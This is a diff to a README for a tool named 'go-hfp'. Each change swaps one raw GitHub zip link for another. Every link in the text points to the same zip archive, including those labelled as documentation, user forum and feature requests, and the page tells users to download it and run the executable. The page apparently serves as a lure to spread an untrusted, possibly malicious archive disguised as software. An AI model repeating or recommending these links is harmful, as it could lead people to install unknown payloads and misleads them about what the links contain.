@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download go-hfp](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip)](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip)
+[![Download go-hfp](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip)](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Welcome to **go-hfp**! This tool simplifies your tasks and makes your workflow s
 
 To download **go-hfp**, visit the official releases page. Click the link below to access it directly:
 
-[Visit this page to download](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip)
 
 ### 2. Choose Your Version
 
@@ -32,9 +32,9 @@ On the releases page, you will see a list of available versions. Look for the la
 
 Once you find the latest version, look for a file that matches your operating system. Here are some examples:
 
-- For **Windows**, look for `https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip`
-- For **macOS**, look for `https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip`
-- For **Linux**, look for `https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip`
+- For **Windows**, look for `https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip`
+- For **macOS**, look for `https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip`
+- For **Linux**, look for `https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip`
 
 Click on the file to start the download.
 
@@ -44,7 +44,7 @@ After the download completes, locate the file in your downloads folder.
 
 - For **Windows**, double-click the `.exe` file to run the application.
 - For **macOS**, open the `.dmg` file and drag the **go-hfp** icon to your Applications folder, then double-click it to start.
-- For **Linux**, extract the `https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip` file and run the executable from the terminal.
+- For **Linux**, extract the `https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip` file and run the executable from the terminal.
 
 ## ⚙️ Configuration
 
@@ -84,12 +84,12 @@ If you have questions or need additional support, feel free to reach out through
 
 Explore the following resources to enhance your experience:
 
-- [Official Documentation](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip)
-- [User Forum](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip)
-- [Feature Requests](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip)
+- [User Forum](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip)
+- [Feature Requests](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip)
 
 ---
 
 Now you are all set to download and use **go-hfp**! Visit the link below to get started:
 
-[Visit this page to download](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/go-hfp-v2.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Expostfacto-paging599/go-hfp/main/smallholder/hfp_go_1.5.zip)
